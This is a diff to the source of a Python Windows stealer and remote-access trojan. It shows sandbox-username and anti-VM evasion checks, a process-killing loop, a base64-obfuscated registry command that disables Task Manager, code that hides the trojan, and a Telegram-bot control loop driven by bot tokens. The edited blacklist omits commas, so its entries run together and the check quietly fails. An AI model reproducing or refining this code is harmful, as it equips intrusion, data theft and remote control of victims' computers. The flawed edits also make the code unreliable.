@@ -117,49 +117,45 @@ historypaths = {
         "360se": f'C:\\Users\\{name}\\AppData\\Roaming\\360se6\\User Data\\Default\\History'
 }
 
-BLACKLISTED_USERS = (
-    'wdagutilityaccount',
-    'abby', 
-    'peter wilson', 
-    'hmarc', 
-    'patex', 
-    'john-pc', 
-    'rdhj0cnfevzx', 
-    'keecfmwgj', 
-    'frank', 
-    '8nl0colnq5bq', 
-    'lisa', 
-    'john', 
-    'george', 
-    'pxmduopvyx', 
-    '8vizsm', 
-    'w0fjuovmccp5a', 
-    'lmvwjj9b', 
-    'pqonjhvwexss', 
-    '3u2v9m8', 
-    'julia', 
-    'heuerzl', 
-    'harry johnson', 
-    'j.seance', 
-    'a.monaldo', 
+BLACKLISTED_USERS = [
+    'abby'
+    'paket'
+    'peter wilson'
+    'hmarc'
+    'patex'
+    'john-pc'
+    'rdhj0cnfevzx'
+    'keecfmwgj'
+    'frank'
+    '8nl0colnq5bq'
+    'lisa'
+    'john'
+    'george'
+    'pxmduopvyx'
+    '8vizsm'
+    'w0fjuovmccp5a'
+    'lmvwjj9b'
+    'pqonjhvwexss'
+    '3u2v9m8'
+    'julia'
+    'heuerzl'
+    'harry johnson'
+    'j.seance'
+    'a.monaldo'
     'tvm'
-)
-
+]
+print("killer &")
 def allkiller():
     while True:
         for p in badprocess:
             killer(p)
 
 Thread(target=allkiller).start()
+print("killer OK")
+if name.lower() in BLACKLISTED_USERS:
+    sys.exit()
 
-if os.getlogin() == "paket":
-    exit()
-
-if int(virtual_memory().total / 1024 / 1024 / 1024) < 7.0: # anti vm
-    for u in BLACKLISTED_USERS:
-        if os.getlogin().lower() in BLACKLISTED_USERS:
-            exit()
-
+print("anti vm OK")
 
 
 # STEALER FUNCS
@@ -416,7 +412,7 @@ def infector():
     subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
     # disable taskmgr
-    os.system(base64.b64decode(b"UkVHIEFERCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg=="))
+    os.system(base64.b64decode(b"UkVHIEFERCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==").decode("utf-8"))
 
     # hide rat
     ratname = sys.argv[0]
@@ -435,7 +431,7 @@ def infector():
 
 
 
-infector()
+Thread(target=infector).start()
 
 def ratfull(token):
     bot = TeleBot(token)
@@ -579,6 +575,7 @@ def ratfull(token):
 while True:
     try:
         for token in TOKENS:
+            print(token)
             try:ratfull(token)
-            except: pass
-    except: pass
+            except BaseException as e:print(e)
+    except BaseException as e: print("err: " + e)
